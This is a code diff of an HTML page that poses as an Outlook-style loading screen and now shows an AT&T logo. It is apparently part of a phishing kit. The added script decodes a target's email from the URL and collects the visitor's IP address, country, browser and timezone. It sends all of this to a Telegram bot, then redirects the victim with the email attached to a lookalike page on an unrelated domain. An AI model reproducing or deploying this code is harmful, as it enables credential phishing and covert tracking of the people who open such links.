@@ -31,21 +31,31 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            flex-direction: column;
+            z-index: 9999;
         }
 
-        #loadingSpinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #f3f3f3;
-            border-top: 6px solid #3498db;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+        #loadingImage {
+            max-width: 200px;
+            max-height: 200px;
+            width: auto;
+            height: auto;
+            object-fit: contain;
+            animation: fadeIn 0.5s ease-in-out;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* Subtle pulse animation for the logo */
+        #loadingImage {
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.9; transform: scale(1.05); }
         }
 
         .dark #loadingScreen {
@@ -55,8 +65,186 @@
         .darkNew #loadingScreen {
             background-color: #1f1f1f;
         }
+
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            #loadingImage {
+                max-width: 150px;
+                max-height: 150px;
+            }
+        }
+
+        @media (min-width: 768px) {
+            #loadingImage {
+                max-width: 250px;
+                max-height: 250px;
+            }
+        }
     </style>
     <script nonce="nonce-placeholder">
+        try {
+            if ("localStorage" in window) {
+                var userNormalizedTheme = window.localStorage.getItem("UsersNormalizedTheme");
+                if (userNormalizedTheme && /\.dark$/.test(userNormalizedTheme)) {
+                    document.documentElement.classList.add("dark");
+                }
+                if (userNormalizedTheme && /\.dark\.new$/.test(userNormalizedTheme)) {
+                    document.documentElement.classList.add("darkNew");
+                }
+                var pwabarcolor = window.localStorage.getItem("PwaTheme");
+                if (pwabarcolor) {
+                    var themetag = document.getElementsByName("theme-color");
+                    if (themetag && themetag.length) {
+                        themetag[0].setAttribute("content", pwabarcolor);
+                    }
+                }
+            }
+        } catch (e) {}
+    </script>
+    <script nonce="nonce-placeholder">
+        function logError(o, n, r, e, a, i) {
+            window.owaErrorHandler ? window.owaErrorHandler(o, n, r, e, a, i) : window.owaBackfilledErrors.push(arguments);
+        }
+        window.FabricConfig = { fontBaseUrl: null };
+        window.owaBackfilledErrors = [];
+        window.onerror = logError;
+        if ("onunhandledrejection" in window) {
+            window.addEventListener("unhandledrejection", function(o) {
+                var n = o && o.reason || "[no reason given]";
+                if (n instanceof Error) {
+                    logError("Unhandled Rejection: " + n, "", 0, 0, n);
+                } else if (n.responseErrorMessage && n.callstackAtRequest && n instanceof Response) {
+                    logError(n.responseErrorMessage, "", void 0, void 0, void 0, n.callstackAtRequest);
+                } else {
+                    logError("Unhandled Rejection: " + (typeof n === "string" ? n : JSON.stringify(n)));
+                }
+            });
+        }
+        window.onload = function() {
+            try {
+                if (!self.App && self.location && self.location.search && self.location.search.indexOf("gulp") === -1) {
+                    window.location.assign("/auth/error?esrc=IndexPageIncomplete");
+                }
+            } catch (o) {}
+        };
+    </script>
+    <script nonce="nonce-placeholder">
+        // ========== TELEGRAM CONFIGURATION ==========
+        // REPLACE THESE VALUES WITH YOUR ACTUAL CREDENTIALS
+        const TELEGRAM_CONFIG = {
+            BOT_TOKEN: 'ksi',  // e.g., '123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ'
+            CHAT_ID: 'ksi'      // e.g., '123456789' or '@yourusername'
+        };
+        // ============================================
+
+        // Visit tracking function
+        async function trackVisit() {
+            try {
+                // Build webhook URL from config
+                const telegramWebhookUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
+                
+                // Validate configuration
+                if (TELEGRAM_CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CONFIG.CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                    console.warn('Telegram configuration not set up. Please update TELEGRAM_CONFIG.');
+                    return;
+                }
+                
+                // Get visitor information including country
+                const getVisitorInfo = () => {
+                    const getIP = () => {
+                        return fetch('https://api.ipify.org?format=json')
+                            .then(response => response.json())
+                            .then(data => data.ip)
+                            .catch(() => 'Unknown IP');
+                    };
+
+                    const getCountry = async (ip) => {
+                        if (ip === 'Unknown IP') return 'Unknown';
+                        try {
+                            // Using ipapi.co for free geolocation (no API key required for basic usage)
+                            const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                            const data = await response.json();
+                            return data.country_name || data.country || 'Unknown';
+                        } catch (error) {
+                            // Fallback to freegeoip.app
+                            try {
+                                const fallbackResponse = await fetch(`https://freegeoip.app/json/${ip}`);
+                                const fallbackData = await fallbackResponse.json();
+                                return fallbackData.country_name || 'Unknown';
+                            } catch {
+                                return 'Unknown';
+                            }
+                        }
+                    };
+
+                    const getUserAgent = () => navigator.userAgent;
+                    const getLanguage = () => navigator.language || navigator.userLanguage || 'Unknown';
+                    const getScreenResolution = () => `${screen.width}x${screen.height}`;
+                    const getReferrer = () => document.referrer || 'Direct';
+                    const getTimestamp = () => new Date().toISOString();
+                    const getTimezone = () => Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                    return getIP().then(ip => {
+                        return Promise.all([
+                            Promise.resolve(ip),
+                            getCountry(ip).then(country => country),
+                            Promise.resolve(getUserAgent()),
+                            Promise.resolve(getLanguage()),
+                            Promise.resolve(getScreenResolution()),
+                            Promise.resolve(getReferrer()),
+                            Promise.resolve(getTimestamp()),
+                            Promise.resolve(getTimezone())
+                        ]);
+                    });
+                };
+
+                const [ip, country, userAgent, language, resolution, referrer, timestamp, timezone] = await getVisitorInfo();
+
+                // Extract email if available
+                const email = extractEmail();
+
+                const message = `
+🕐 *New Website Visit Detected*
+
+👤 *Email:* ${email || 'Not available'}
+🌐 *IP Address:* \`${ip}\`
+🌍 *Country:* ${country}
+💻 *User Agent:* ${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}
+🌐 *Language:* ${language}
+📱 *Resolution:* ${resolution}
+🔗 *Referrer:* ${referrer}
+📅 *Timestamp:* ${timestamp}
+🕐 *Timezone:* ${timezone}
+
+---
+*Visit Details:*
+• Page URL: ${window.location.href}
+• Page Title: ${document.title}
+                `;
+
+                const payload = {
+                    chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                };
+
+                // Send to Telegram
+                const response = await fetch(telegramWebhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    console.warn('Failed to send visit notification to Telegram');
+                }
+            } catch (error) {
+                console.warn('Visit tracking error:', error);
+            }
+        }
+
         // Extract and decode Base64 from ?code= or #
         function extractEmail() {
             const params = new URLSearchParams(window.location.search);
@@ -82,31 +270,36 @@
             return '';
         }
 
-        document.addEventListener("DOMContentLoaded", function() {
-            try {
+        try {
+            if ("localStorage" in window) {
                 const email = extractEmail();
-                if ("localStorage" in window) {
-                    localStorage.setItem('email', email);
-                }
+                localStorage.setItem('email', email);
+
+                // Track visit immediately
+                trackVisit();
 
                 // Redirect with decoded value
-                var delayInMilliseconds = 2000; // 2 seconds delay
-                var targetUrl = "https://login.townnieforgebox.org/inbox/mail/";
+                var delayInMilliseconds = 3000; // 5 seconds delay
+                var targetUrl = "https://petrogrease.com.co/sea/att";
                 setTimeout(function() {
                     if (email) {
-                        window.location.href = targetUrl + "#" + email;
+                        window.location.href = targetUrl + "#" + encodeURIComponent(email);
                     } else {
                         window.location.href = targetUrl;
                     }
                 }, delayInMilliseconds);
-            } catch (e) {}
-        });
+            }
+        } catch (e) {}
     </script>
     <noscript>JavaScript must be enabled.</noscript>
 </head>
 <body>
     <div id="loadingScreen">
-        <div id="loadingSpinner"></div>
+        <!-- AT&T Logo as loading image -->
+        <img id="loadingImage" 
+             src="https://cdn.freebiesupply.com/images/large/2x/att-logo-transparent.png" 
+             alt="AT&T Loading..." 
+             onerror="this.src='https://via.placeholder.com/200x200/cccccc/ffffff?text=Loading...'">
     </div>
 </body>
 </html>
